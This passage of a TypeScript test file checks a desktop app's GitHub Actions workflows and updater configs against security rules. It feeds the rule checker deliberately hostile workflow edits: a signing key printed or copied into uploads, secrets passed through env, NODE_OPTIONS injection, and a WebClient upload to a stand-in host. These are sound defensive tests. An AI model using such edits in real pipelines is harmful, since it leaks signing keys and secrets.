    ['a secret hidden behind a } inside an expression', (t) => t.replace('        run: npm ci --ignore-scripts', "        env:\n          T: ${{ format('{0}', secrets.T) }}\n        run: npm ci --ignore-scripts"), /secret or the token/],
    ['a variable hidden behind a } inside an expression', (t) => t.replace('        run: npm ci --ignore-scripts', "        env:\n          V: ${{ format('{0}', vars.X) }}\n        run: npm ci --ignore-scripts"), /reads a repository variable/],
    ['the token spelled with brackets', (t) => t.replace('        run: npm ci --ignore-scripts', "        env:\n          T: ${{ github['token'] }}\n        run: npm ci --ignore-scripts"), /secret or the token/],
  ]

  it.each(hostile)('refuse %s', (_name, change, expected) => {
    const changed = change(GOOD_CI)

    expect(changed).not.toBe(GOOD_CI)
    expect(workflowProblems(parse(changed), 'ci').join(' | ')).toMatch(expected)
  })

  it('are not met by the manual rules alone: a push trigger is refused there, as before', () => {
    expect(workflowProblems(parse(GOOD_CI), 'manual').join(' | ')).toMatch(/not by hand only/)
  })
})

describe('the CI workflow (31.1)', () => {
  const text = readFileSync(join(WORKFLOWS, 'ci.yml'), 'utf8')
  const workflow = loadYaml(text) as Workflow
  const runs = Object.values(workflow.jobs).flatMap((job) => (job.steps ?? []).map((step) => step.run ?? ''))
  const lines = runs.flatMap((run) => run.split('\n').map((line) => line.trim()))

  // What it promises (docs/tasks/plan.md Phase 31, 31.1): a rule that is dropped from the file must fail here.
  it.each([
    ['the key and secret scan', 'npm run secrets:scan'],
    ['the type check', 'npm run typecheck'],
    ['the linter', 'npm run lint'],
    ['the server tests', 'npm run test -w @listulator/server'],
    ['the web tests', 'npm run test -w @listulator/web'],
    ['the browser tests', 'npm run test:e2e -w @listulator/web'],
    ['the notices check', 'git diff --exit-code -- THIRD-PARTY-NOTICES.txt'],
  ])('runs %s', (_name, command) => {
    expect(lines.some((line) => line.startsWith(command))).toBe(true)
  })

  it('runs the Rust tests on Windows, where the desktop app ships, and the web checks on Linux', () => {
    const runners = Object.fromEntries(Object.entries(workflow.jobs).map(([name, job]) => [name, job['runs-on']]))

    expect(Object.values(runners)).toEqual(expect.arrayContaining(['ubuntu-24.04', 'windows-2025']))
    expect(lines.some((line) => /^cargo test .*--locked/.test(line))).toBe(true)
  })

  it('runs the secret scan before anything else that installs or builds more than the dependencies', () => {
    const scan = lines.findIndex((line) => line.startsWith('npm run secrets:scan'))
    const build = lines.findIndex((line) => /^npm run (typecheck|lint|test)/.test(line))

    expect(scan).toBeGreaterThanOrEqual(0)
    expect(scan).toBeLessThan(build)
  })
})

describe('GitHub Actions workflows', () => {
  const workflows = readdirSync(WORKFLOWS)
    .filter((name) => /\.ya?ml$/.test(name))
    .map((name) => ({ name, workflow: loadYaml(readFileSync(join(WORKFLOWS, name), 'utf8')) as Workflow }))

  it('exist (an empty folder would make every rule below pass on nothing)', () => {
    expect(workflows.map((entry) => entry.name)).toEqual(expect.arrayContaining(['canary.yml', 'ci.yml', 'desktop-windows.yml', 'release.yml']))
  })

  // `release.yml` is judged by the release rules, `ci.yml` by the CI rules, `canary.yml` by the canary rules; any other workflow, including one added later, by the strict manual ones.
  const profileOf = (name: string): Profile => (name === 'release.yml' ? 'release' : name === 'ci.yml' ? 'ci' : name === 'canary.yml' ? 'canary' : name === 'updater-test-windows.yml' ? 'updaterTest' : 'manual')
  it.each(workflows)('$name breaks none of the rules', ({ name, workflow }) => {
    expect(workflowProblems(workflow, profileOf(name))).toEqual([])
  })
})

/**
 * The Release run's Windows job installs the installer it built and starts it before the upload (BL-120). The workflow rules above hold the
 * step to its place; these hold what it runs: one plain tsx line on the tool, with no npm hook that would run code next to it (npm runs `pre`
 * and `post` scripts by name), no `.npmrc` and no package manager field that would change what an npm command does. The real workflow is also
 * held to the rules above by the test that runs them on every file here.
 */
describe('what the release install check runs (BL-120)', () => {
  const ROOT = join(import.meta.dirname, '../..')
  const pkg = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8')) as { scripts: Record<string, string> }
  const release = loadYaml(readFileSync(join(WORKFLOWS, 'release.yml'), 'utf8')) as Workflow

  it('is a plain tsx line on the tool, and nothing else', () => {
    expect(pkg.scripts['release:install-check']).toBe('tsx server/src/tools/releaseInstallCheck.ts')
  })

  it.each(['pre', 'post'])('has no npm %s hook for it (npm runs it by name, in the same step)', (when) => {
    expect(pkg.scripts[`${when}release:install-check`]).toBeUndefined()
  })

  it('runs in the Windows build job of the Release run, right before the installer is uploaded, and in no other job or workflow', () => {
    const runners = Object.entries(release.jobs).filter(([, job]) => (job.steps ?? []).some((step) => step.run?.trim() === 'npm run release:install-check'))
    expect(runners.map(([name, job]) => [name, job['runs-on']])).toEqual([['build-windows', 'windows-2025']])

    const steps = release.jobs['build-windows']!.steps ?? []
    const at = steps.findIndex((step) => step.run?.trim() === 'npm run release:install-check')
    expect(steps[at + 1]?.uses).toMatch(/^actions\/upload-artifact@/)
    expect(Object.keys(steps[at]!).sort()).toEqual(['name', 'run'])

    for (const name of readdirSync(WORKFLOWS).filter((file) => file !== 'release.yml')) {
      expect(readFileSync(join(WORKFLOWS, name), 'utf8'), name).not.toMatch(/release:install-check/)
    }
  })
})

/**
 * The versions the repository builds with are written down once each and are exact (security review, Phase 19, SR-041): the compiler in
 * `rust-toolchain.toml`, Node in `.node-version`. The workflow reads both (the rules above), Cargo's own `rust-version` agrees with the
 * compiler, so a bump is one deliberate commit that changes these files together and says why in docs/DECISIONS.md.
 */
describe('the pinned toolchain', () => {
  const ROOT = join(import.meta.dirname, '../..')
  const EXACT = /^\d+\.\d+\.\d+$/
  const read = (path: string) => readFileSync(join(ROOT, path), 'utf8')
  const toolchain = read('rust-toolchain.toml')
  const channel = /^channel\s*=\s*"([^"]+)"/m.exec(toolchain)?.[1]

  it('names Node exactly, once, in .node-version', () => {
    expect(read('.node-version').trim()).toMatch(EXACT)
  })

  it('names the Rust compiler exactly, once, in rust-toolchain.toml, with the minimal profile', () => {
    expect(channel).toMatch(EXACT)
    expect(toolchain).toMatch(/^profile\s*=\s*"minimal"/m)
    // The settings, not the comments (which explain why "stable" is not used).
    expect(toolchain.replace(/^\s*#.*$/gm, '')).not.toMatch(/\b(stable|beta|nightly)\b/)
  })

  it('has Cargo.toml say the same compiler as its minimum (a lower number was never tried)', () => {
    expect(/^rust-version\s*=\s*"([^"]+)"/m.exec(read('apps/desktop/src-tauri/Cargo.toml'))?.[1]).toBe(channel)
  })

  it('is what the root package says it runs on: Node at the version file or above within the same major', () => {
    const engines = (JSON.parse(read('package.json')) as { engines?: { node?: string } }).engines?.node ?? ''
    const major = Number(read('.node-version').trim().split('.')[0])

    expect(engines).toMatch(/^>=\d+/)
    expect(Number(engines.replace(/^>=/, ''))).toBeLessThanOrEqual(major)
  })
})


/**
 * The switch that makes `tauri build` produce update files lives in an overlay that only `release.yml` passes (20.12a, DECISIONS
 * 2026-10-11). In the shared config it would make every bundling build, the owner's own included, fail without a private key.
 */
describe('the updater-artifacts overlay', () => {
  const ROOT = join(import.meta.dirname, '../..')
  const read = (path: string) => readFileSync(join(ROOT, path), 'utf8')
  const overlay = JSON.parse(read('apps/desktop/src-tauri/tauri.updater-artifacts.conf.json')) as Record<string, unknown>
  const shared = JSON.parse(read('apps/desktop/src-tauri/tauri.conf.json')) as { bundle?: Record<string, unknown>; plugins?: { updater?: Record<string, unknown> } }

  it('holds the one switch and nothing else: no key, no endpoint, no insecure flag', () => {
    expect(Object.fromEntries(Object.entries(overlay).filter(([key]) => key !== '$schema'))).toEqual({ bundle: { createUpdaterArtifacts: true } })
  })

  it('is not in the shared config, which stays buildable without a key', () => {
    expect(shared.bundle).not.toHaveProperty('createUpdaterArtifacts')
  })

  it('is the file the release workflow passes, by the path the guard above requires', () => {
    expect(UPDATER_OVERLAY).toBe('src-tauri/tauri.updater-artifacts.conf.json')
    expect(read('.github/workflows/release.yml')).toContain(`--config ${UPDATER_OVERLAY}`)
  })

  it('leaves the updater plugin config (the real public key, a signed version, https only) to the shared config', () => {
    expect(shared.plugins?.updater).toMatchObject({ requireSignedVersion: true })
    expect(JSON.stringify(shared.plugins?.updater)).not.toMatch(/dangerous/)
  })
})

/**
 * The test build of the updater (20.13a, DECISIONS 2026-10-11). Two versions of the app are installed and updated over `http://127.0.0.1`,
 * which needs an insecure-transport flag. That flag, the local endpoint and the separate app identity live in ONE file that no release
 * path can reach: the release config and `release.yml` never carry or name it, and only the hand-started test workflow passes it.
 */
describe('the updater test build', () => {
  const ROOT = join(import.meta.dirname, '../..')
  const read = (path: string) => readFileSync(join(ROOT, path), 'utf8')
  const TEST_CONFIG = 'apps/desktop/src-tauri/tauri.updater-test.conf.json'
  const testConfig = JSON.parse(read(TEST_CONFIG)) as {
    productName?: string
    identifier?: string
    plugins?: { updater?: Record<string, unknown> }
  } & Record<string, unknown>
  const release = JSON.parse(read('apps/desktop/src-tauri/tauri.conf.json')) as {
    productName: string
    identifier: string
    plugins: { updater: { endpoints: string[] } }
  }

  it('is a separate app: its own identifier and product name, so a test install never touches a real install or its data folder', () => {
    expect(testConfig.identifier).toBe('com.listulator.desktop.updatertest')
    expect(testConfig.identifier).not.toBe(release.identifier)
    expect(testConfig.productName).toBe('ListulatorUpdaterTest')
    expect(testConfig.productName).not.toBe(release.productName)
  })

  it('points at the local endpoint only, with the insecure flag, and changes nothing else about the updater (the real public key stays)', () => {
    expect(testConfig.plugins?.updater).toEqual({
      endpoints: ['http://127.0.0.1:8099/latest.json'],
      dangerousInsecureTransportProtocol: true,
    })
    expect(Object.keys(testConfig).sort()).toEqual(['$schema', 'app', 'identifier', 'plugins', 'productName'])
  })

  // The update test drives the installed app through WebView2's debugging port (31.2: the environment variable is not honoured by this app, the
  // window's own `additionalBrowserArgs` is). So the TEST build's window opens a port, and no shipped build may: a port that any local program
  // can talk to is the app's whole page, its data and its updater.
  describe('the debugging port of the update test', () => {
    const PRODUCTION_ARGS = '--disable-features=msWebOOUI,msPdfOOUI,msSmartScreenProtection --autoplay-policy=no-user-gesture-required'
    const windowsOf = (config: unknown) => (config as { app?: { windows?: Record<string, unknown>[] } }).app?.windows ?? []
    const releaseWindow = windowsOf(JSON.parse(read('apps/desktop/src-tauri/tauri.conf.json')))[0]!

    it('is the shipped window with one key added: the production browser arguments and the port, and nothing else changed', () => {
      expect(windowsOf(testConfig)).toEqual([{ ...releaseWindow, additionalBrowserArgs: `${PRODUCTION_ARGS} --remote-debugging-port=9222` }])
    })

    // SR-083 (BL-129): the update test's driver is Node (Playwright's connectOverCDP), whose WebSocket sends no Origin header, so the browser has
    // nothing to refuse and the flag only lets any web page in a browser on the same machine try the port during a run.
    it('does not allow any origin to reach the port: no --remote-allow-origins at all (SR-083)', () => {
      expect(JSON.stringify(testConfig)).not.toMatch(/remote-allow-origins/i)
    })

    it('opens the port on the test app only: no other config, workflow or the release config carries a debugging port', () => {
      const others = readdirSync(join(ROOT, 'apps/desktop/src-tauri')).filter((name) => /^tauri.*\.json$/.test(name) && name !== 'tauri.updater-test.conf.json')
      expect(others).toContain('tauri.conf.json')
      for (const name of others) expect(read(`apps/desktop/src-tauri/${name}`), name).not.toMatch(/remote-debugging|remote-allow-origins/i)
      for (const name of readdirSync(WORKFLOWS)) expect(readFileSync(join(WORKFLOWS, name), 'utf8'), name).not.toMatch(/remote-debugging|remote-allow-origins|WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS/i)
      expect(read('apps/desktop/src-tauri/src/lib.rs')).not.toMatch(/remote-debugging|remote-allow-origins/i)
    })
  })

  it('is not in the release config, whose only endpoint is GitHub’s latest download over https and which has no dangerous* key anywhere', () => {
    const text = read('apps/desktop/src-tauri/tauri.conf.json')

    expect(release.plugins.updater.endpoints).toEqual(['https://github.com/gerharar/listulator/releases/latest/download/latest.json'])
    expect(text).not.toMatch(/dangerous|127\.0\.0\.1|updater-test/i)
    // `localhost` appears legitimately (the dev server's address, the IPC host in the CSP); the updater's own block must not have it or any plain http.
    expect(JSON.stringify(release.plugins)).not.toMatch(/localhost|http:/i)
  })

  it('is never named or carried by the release workflow, the updater-artifacts overlay, or any other workflow than its own', () => {
    for (const file of ['.github/workflows/release.yml', 'apps/desktop/src-tauri/tauri.updater-artifacts.conf.json']) {
      expect(read(file), file).not.toMatch(/updater-test|updater:test-config|dangerous|127\.0\.0\.1/i)
    }
    for (const name of readdirSync(WORKFLOWS).filter((file) => /\.ya?ml$/.test(file) && file !== 'updater-test-windows.yml')) {
      expect(readFileSync(join(WORKFLOWS, name), 'utf8'), name).not.toMatch(/updater-test|updater:test-config/)
    }
  })

  describe('the hand-started workflow that builds it', () => {
    const text = readFileSync(join(WORKFLOWS, 'updater-test-windows.yml'), 'utf8')
    const workflow = loadYaml(text) as Workflow
    const steps = Object.values(workflow.jobs).flatMap((job) => job.steps ?? [])
    const runs = steps.map((step) => step.run ?? '')

    it('passes the updater test rules (the manual rules, and the rules for its throw-away key)', () => {
      expect(workflowProblems(workflow, 'updaterTest')).toEqual([])
    })

    it('is started by hand with two required inputs: the app to install and the update it is offered', () => {
      expect(workflow.on).toEqual({
        workflow_dispatch: { inputs: { version: expect.objectContaining({ type: 'string', required: true }), update_version: expect.objectContaining({ type: 'string', required: true }) } },
      })
    })

    it('sets each version it builds from its own input through version:set, handing the input over env, never pasted', () => {
      const setting = steps.filter((step) => /\bversion:set\b/.test(step.run ?? ''))

      expect(setting.map((step) => step.env?.['VERSION'])).toEqual(['${{ inputs.version }}', '${{ inputs.update_version }}'])
      for (const step of setting) expect(step.run).toContain('$env:VERSION')
    })

    it('builds the two apps of one test at the same time as other tests, but never the same pair twice: its concurrency group names both versions', () => {
      expect((workflow as Workflow & { concurrency?: unknown }).concurrency).toEqual({
        group: 'updater-test-windows-${{ inputs.version }}-${{ inputs.update_version }}',
        'cancel-in-progress': true,
      })
    })

    it('has no repository secret, no variable and no release key: the key is made in the run', () => {
      expect(text).not.toMatch(/secrets\.|vars\.|TAURI_SIGNING|updater-artifacts|createUpdaterArtifacts/)
    })

    it('builds with the config the run made, which derives from the committed test config and carries no key of its own', () => {
      const made = runs.join('\n')

      expect(made).toContain('updater:test-config -- config')
      expect(made).toContain('--out $conf')
      expect(testConfig.plugins?.updater).not.toHaveProperty('pubkey')
    })

    it('uploads the two installers, the update’s signature and the manifest by exact name, kept for 3 days', () => {
      const upload = steps.find((step) => step.uses?.startsWith('actions/upload-artifact@'))

      expect(String(upload?.with?.['path']).trim().split('\n')).toEqual([
        'updater-test-out/ListulatorUpdaterTest_${{ inputs.version }}_x64-setup.exe',
        'updater-test-out/ListulatorUpdaterTest_${{ inputs.update_version }}_x64-setup.exe',
        'updater-test-out/ListulatorUpdaterTest_${{ inputs.update_version }}_x64-setup.exe.sig',
        'updater-test-out/latest.json',
      ])
      expect(upload?.with?.['retention-days']).toBe(3)
    })

    it('runs the update test once, last: after the upload, and after the key is deleted, so the test never has the key on its disk', () => {
      const names = steps.map((step) => step.name ?? step.uses ?? '')
      const at = (matching: RegExp) => steps.findIndex((step) => matching.test(`${step.run ?? ''} ${step.uses ?? ''}`))
      const testing = steps.filter((step) => /\btest:desktop-update\b/.test(step.run ?? ''))

      expect(testing).toHaveLength(1)
      expect(at(/\btest:desktop-update\b/)).toBeGreaterThan(at(/upload-artifact/))
      expect(at(/\btest:desktop-update\b/)).toBeGreaterThan(at(/Remove-Item/))
      expect(testing[0]?.run?.split('\n').map((line) => line.trim())).toEqual(['npm run test:desktop-update -- updater-test-out', 'if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }', ''])
      expect(names.at(-1)).toMatch(/update test/i)
    })

    // The last step of the real workflow, as the hostile cases below move, repeat and drop it.
    const TEST_STEP =
      '      - name: The update test (installs the older app, updates it the way a person does, checks it, removes it)\n' +
      '        shell: pwsh\n' +
      '        run: |\n' +
      '          npm run test:desktop-update -- updater-test-out\n' +
      '          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }\n'

    // Each change below breaks one rule of the throw-away key (S1 to S4); the real workflow, changed in that one place, must be refused.
    const hostile: [string, (t: string) => string, RegExp][] = [
      ['a key made without --ci', (t) => t.replace('signer generate --ci', 'signer generate'), /not made with --ci/],
      ['a second key', (t) => t.replace('Write-Output "::add-mask::', 'npm run tauri -w @listulator/desktop -- signer generate --ci -w $key\n          Write-Output "::add-mask::'), /makes 2 keys/],
      ['a key in the checkout, not the temp folder', (t) => t.replace("$key = Join-Path $env:RUNNER_TEMP 'updater-test-run.key'", "$key = 'updater-test-run.key'"), /not a file in the runner's temp folder in every step/],
      ['a key file named elsewhere', (t) => t.replace('-f $key', '-f D:\\keys\\other.key'), /outside the runner's temp folder|signs with something other than the key file/],
      ['no hiding of the key in the log', (t) => t.replace(/ *Write-Output "::add-mask::[^\n]*\n/, ''), /does not hide the key/],
      ['the key printed', (t) => t.replace(/Write-Output "::add-mask::[^\n]*/, 'Get-Content $key'), /reads or prints the key|does not hide the key/],
      ['the key printed after it is hidden', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          Write-Host (Get-Content $key)\n          Write-Output'), /reads or prints the key outside the line that hides it/],
      ['the key copied to the upload folder', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          Copy-Item $key updater-test-out\n          Write-Output'), /reads or prints the key outside the line that hides it/],
      ['signing with the key text on the command line', (t) => t.replace('-f $key', '-k $env:KEY'), /signs with something other than the key file|key text on the command line/],
      ['signing without a version', (t) => t.replace(' --app-version $env:UPDATE_VERSION', ''), /without --app-version/],
      ['a key that is not deleted when the run fails', (t) => t.replace('if: always()', 'if: success()'), /does not delete the key in a step that always runs/],
      ['a key deleted before its last use', (t) => t.replace(/ {6}- name: Delete the run's key[^\n]*\n(?: {8}[^\n]*\n)+/, ''), /does not delete the key|deletes the key before/],
      ['a value handed on through GITHUB_ENV', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          "K=1" >> $env:GITHUB_ENV\n          Write-Output'), /outlives a step/],
      ['a value handed on through GITHUB_OUTPUT', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          "k=1" >> $env:GITHUB_OUTPUT\n          Write-Output'), /outlives a step/],
      ['a trace of every command', (t) => t.replace('$key = Join-Path', 'Set-PSDebug -Trace 1\n          $key = Join-Path'), /tracing, a transcript or verbose/],
      ['a second job', (t) => t + '\n  other:\n    runs-on: windows-2025\n    timeout-minutes: 5\n    steps:\n      - run: echo hi\n', /jobs \(the key must live in exactly one\)/],
      ['a cache that could carry the key between runs', (t) => t.replace('      - name: Install dependencies', `      - uses: actions/cache@${'a'.repeat(40)} # v1\n        with:\n          path: x\n          key: y\n      - name: Install dependencies`), /a way to carry the key between runs/],
      ['an upload of everything in the folder', (t) => t.replace('updater-test-out/latest.json', 'updater-test-out/'), /not an exact file name/],
      ['an upload with a wildcard', (t) => t.replace('updater-test-out/latest.json', 'updater-test-out/*'), /not an exact file name/],
      ['an upload of the temp folder', (t) => t.replace('updater-test-out/latest.json', '${{ runner.temp }}/updater-test-run.key'), /not an exact file name/],
      ['an upload of a key file by name', (t) => t.replace('updater-test-out/latest.json', 'updater-test-out/updater-test-run.key'), /not an exact file name/],
      ['an artifact kept a week', (t) => t.replace('retention-days: 3', 'retention-days: 7'), /not kept for exactly 3 days/],
      ['a second upload', (t) => t + `\n      - uses: actions/upload-artifact@${'b'.repeat(40)} # v1\n        with:\n          name: z\n          path: updater-test-out/latest.json\n          retention-days: 3\n`, /2 upload-artifact steps/],
      ['no verification of the signed installer', (t) => t.replace('updater:test-config -- verify', 'echo skipped'), /does not verify the signed installer/],
      ['no check of the upload folder', (t) => t.replace('updater:test-config -- staging', 'echo skipped'), /does not check the upload folder/],
      ['a build that does not use the run config', (t) => t.replace(/--config \$conf/, '--config src-tauri/tauri.updater-test.conf.json'), /does not use the run config/],
      ['a build of more than the installer', (t) => t.replace(/--bundles nsis/, '--bundles all'), /makes more than the installer/],
      // The security review's probes (2026-10-21): each of these passed the first version of the rules.
      ['the key read by a .NET call and printed', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          $k = [IO.File]::ReadAllText($key); Write-Output ($k.ToCharArray() -join " ")\n          Write-Output'), /outside the allowed commands/],
      ['the key printed through a path built in the line', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          Write-Output (Get-Content (Join-Path $env:RUNNER_TEMP 'updater-test-run.key') -Raw)\n          Write-Output"), /outside the allowed commands/],
      ['the key copied to the upload folder by its path', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          Copy-Item (Join-Path $env:RUNNER_TEMP 'updater-test-run.key') updater-test-out\n          Write-Output"), /outside the allowed commands/],
      ['$key moved by an assignment', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          $key += '/../../x'\n          Write-Output"), /outside the allowed commands/],
      ['$key redefined by a variable cmdlet', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          Set-Variable -Name ke -Value 'x'\n          Write-Output"), /variable cmdlets/],
      ['the temp folder listed by its literal path', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          Get-ChildItem D:\\a\\_temp\n          Write-Output'), /outside the allowed commands|the runner's temp folder by its literal path/],
      ['a verification that is switched off', (t) => t.replace('      - name: The update verifies against this run\'s key, fails against the real one, and is newer\n', "      - name: The update verifies against this run's key, fails against the real one, and is newer\n        if: false\n"), /a step has an if: other than/],
      ['a staging check behind a condition', (t) => t.replace('      - name: Nothing to upload holds the key\n', "      - name: Nothing to upload holds the key\n        if: ${{ inputs.version != 'x' }}\n"), /a step has an if: other than/],
      ['the delete step with a different condition', (t) => t.replace('if: always()', 'if: failure()'), /does not delete the key in a step that always runs|a step has an if: other than/],
      ['the staging check commented out', (t) => t.replace('npm run updater:test-config -- staging', '# npm run updater:test-config -- staging'), /does not check the upload folder/],
      ['the hiding of the key commented out', (t) => t.replace('Write-Output "::add-mask::', '# Write-Output "::add-mask::'), /does not hide the key|outside the allowed commands/],
      ['a staging check whose failure is ignored', (t) => t.replace('--key-file $key\n          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }', '--key-file $key\n          exit 0'), /not followed by its exit-code check|forces a success/],
      ['a check followed by exit 0 on the same line', (t) => t.replace('--installed-version $env:VERSION', '--installed-version $env:VERSION; exit 0'), /outside the allowed commands|forces a success/],
      ['a deletion that deletes nothing (-WhatIf)', (t) => t.replace('-Force -ErrorAction SilentlyContinue', '-Force -WhatIf'), /outside the allowed commands|does not delete/],
      ['a deletion of another file', (t) => t.replace("'updater-test-run.key*'", "'nothing.key*'"), /outside the allowed commands|does not delete/],
      ['the wrong file embedded as the public key', (t) => t.replace('--pubkey-file "$key.pub" --out $conf', '--pubkey-file "$key" --out $conf'), /outside the allowed commands/],
      ['a cache action that could save the temp folder', (t) => t.replace('      - name: Install dependencies', `      - uses: actions/cache/save@${'a'.repeat(40)} # v1\n        with:\n          path: \${{ runner.temp }}\n          key: y\n      - name: Install dependencies`), /outside the allowed three/],
      ['an artifact merge action', (t) => t.replace('      - name: Install dependencies', `      - uses: actions/upload-artifact/merge@${'a'.repeat(40)} # v1\n        with:\n          name: x\n      - name: Install dependencies`), /outside the allowed three/],
      ['a script action that could read the key', (t) => t.replace('      - name: Install dependencies', `      - uses: actions/github-script@${'a'.repeat(40)} # v1\n        with:\n          script: return 1\n      - name: Install dependencies`), /outside the allowed three/],
      ['a .NET upload of a file', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          [Net.WebClient]::new().UploadFile('http://example.invalid', 'x')\n          Write-Output"), /network or upload command/],
      ['a first step that no longer checks the two versions', (t) => t.replace(/-notmatch/g, '-match'), /does not check the two versions first/],
      ['the version check moved after the checkout', (t) => t.replace(/ {6}- name: The versions are versions[\s\S]*?(?= {6}- uses: actions\/checkout)/, '').replace('      - name: Install dependencies', '      - name: The versions are versions\n        shell: pwsh\n        env:\n          VERSION: ${{ inputs.version }}\n          UPDATE_VERSION: ${{ inputs.update_version }}\n        run: |\n          if ($env:VERSION -notmatch "^x$" -or $env:UPDATE_VERSION -notmatch "^x$") { throw "no" }\n      - name: Install dependencies'), /does not check the two versions first/],
      // The update test (31.7) may run only with the key gone and the files kept, on the one folder, once, and never skipped.
      ['the update test before the key is deleted', (t) => t.replace(TEST_STEP, '').replace('      - uses: actions/upload-artifact@', `${TEST_STEP}      - uses: actions/upload-artifact@`), /before the key is deleted/],
      ['the update test twice', (t) => `${t.replace(/\n*$/, '\n')}${TEST_STEP}`, /runs the update test 2 times/],
      ['the update test aimed at another folder', (t) => t.replace('test:desktop-update -- updater-test-out', 'test:desktop-update -- .'), /update test is not exactly/],
      ['the update test whose failure is ignored', (t) => t.replace('test:desktop-update -- updater-test-out\n          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }', 'test:desktop-update -- updater-test-out\n          exit 0'), /not followed by its exit-code check|forces a success/],
      ['the update test behind a condition', (t) => t.replace('        shell: pwsh\n        run: |\n          npm run test:desktop-update', '        if: false\n        shell: pwsh\n        run: |\n          npm run test:desktop-update'), /a step has an if: other than/],
      ['no update test at all', (t) => t.replace(TEST_STEP, ''), /runs the update test 0 times/],
      // The security review's probes (2026-10-21, 31.7): the same code reached without the one literal, and a step that carries more than its two lines.
      ['the update test run early through npm exec', (t) => t.replace('      - uses: actions/upload-artifact@', '      - name: Early\n        shell: pwsh\n        run: |\n          npm exec tsx server/src/tools/desktopUpdateTestRun.ts -- updater-test-out\n          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }\n      - uses: actions/upload-artifact@'), /update test|desktopUpdateTestRun/],
      ['the Playwright config of the update test run early', (t) => t.replace('      - uses: actions/upload-artifact@', '      - name: Early\n        shell: pwsh\n        run: |\n          node node_modules/@playwright/test/cli.js test -c web/playwright.desktop.config.ts\n          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }\n      - uses: actions/upload-artifact@'), /update test|playwright\.desktop/],
      ['the update test with an environment of its own', (t) => t.replace('        shell: pwsh\n        run: |\n          npm run test:desktop-update', '        env:\n          NODE_OPTIONS: --require x.js\n        shell: pwsh\n        run: |\n          npm run test:desktop-update'), /update test step has more than/],
      ['the update test with a line more', (t) => t.replace('          npm run test:desktop-update -- updater-test-out\n', '          npm run test:desktop-update -- updater-test-out\n          Get-ChildItem\n'), /update test step has more than|not exactly/],
      ['a secret', (t) => t.replace('      - name: Install dependencies\n        run: npm ci --ignore-scripts', '      - name: Install dependencies\n        env:\n          K: ${{ secrets.KEY }}\n        run: npm ci --ignore-scripts'), /secret or the token/],
      ['a push trigger', (t) => t.replace('on:\n  workflow_dispatch:', 'on:\n  push:\n  workflow_dispatch:'), /not by hand only/],
    ]

    it.each(hostile)('refuses %s', (_name, change, expected) => {
      const changed = change(text)

      expect(changed).not.toBe(text)
      expect(workflowProblems(loadYaml(changed) as Workflow, 'updaterTest').join(' | ')).toMatch(expected)
    })

    it('is judged as strictly as a manual workflow by the manual profile too, apart from the one signature it uploads', () => {
      const problems = workflowProblems(workflow, 'manual').join(' | ')

      expect(problems).toMatch(/\.sig file/)
      expect(problems.replace(/job [\w-]+: upload-artifact takes a \.sig file[^|]*/, '').replace(/ \| $/, '')).toBe('')
    })
  })
})

/**
 * The probe build (20.16, DECISIONS 2026-10-12). The probes of the security review (the isolation hook, the navigation guard, the
 * updater's shapes) need a build with an inspector, and they must never run in an app that holds the owner's library. So the debug
 * profile of the hand-started Windows workflow builds a SEPARATE app: its own product name (its own install folder and uninstall
 * entry) and identifier (its own data folder). Nothing else differs from the release config, so the capabilities, the hook and the
 * CSP under test are the shipped ones. No release path can reach the file.
 */
describe('the probe build', () => {
  const ROOT = join(import.meta.dirname, '../..')
  const read = (path: string) => readFileSync(join(ROOT, path), 'utf8')
  const PROBE_CONFIG = 'apps/desktop/src-tauri/tauri.probe.conf.json'
  const PROBE_ARGUMENT = 'src-tauri/tauri.probe.conf.json'
  const probe = JSON.parse(read(PROBE_CONFIG)) as { productName?: string; identifier?: string } & Record<string, unknown>
  const release = JSON.parse(read('apps/desktop/src-tauri/tauri.conf.json')) as { productName: string; identifier: string }
  const others = ['tauri.updater-test.conf.json', 'tauri.dev.conf.json'].map((name) => JSON.parse(read(`apps/desktop/src-tauri/${name}`)) as { productName?: string; identifier: string })

  it('is a separate app: its own product name and identifier, different from the release app, the updater test app and the dev app', () => {
    expect(probe.identifier).toBe('com.listulator.desktop.probe')
    expect(probe.productName).toBe('ListulatorProbe')
    for (const other of [release, ...others]) {
      expect(probe.identifier).not.toBe(other.identifier)
      if (other.productName !== undefined) expect(probe.productName).not.toBe(other.productName)
    }
  })

  it('changes nothing but the name and the identifier: the capabilities, the hook, the CSP and the updater are the shipped ones', () => {
    expect(Object.keys(probe).sort()).toEqual(['$schema', 'identifier', 'productName'])
  })

  it('is passed by the debug branch of the manual Windows workflow only, never by the release branch', () => {
    const lines = read('.github/workflows/desktop-windows.yml').split('\n').filter((line) => /\btauri:build\b/.test(line))
    const debug = lines.filter((line) => line.includes('--debug'))
    const shipped = lines.filter((line) => !line.includes('--debug'))

    expect(debug).toHaveLength(1)
    expect(debug[0]).toContain(`--config ${PROBE_ARGUMENT}`)
    expect(shipped).toHaveLength(1)
    expect(shipped[0]).not.toMatch(/--config/)
  })

  it('is never named by the release workflow, the updater-artifacts overlay, the updater test workflow or the release config', () => {
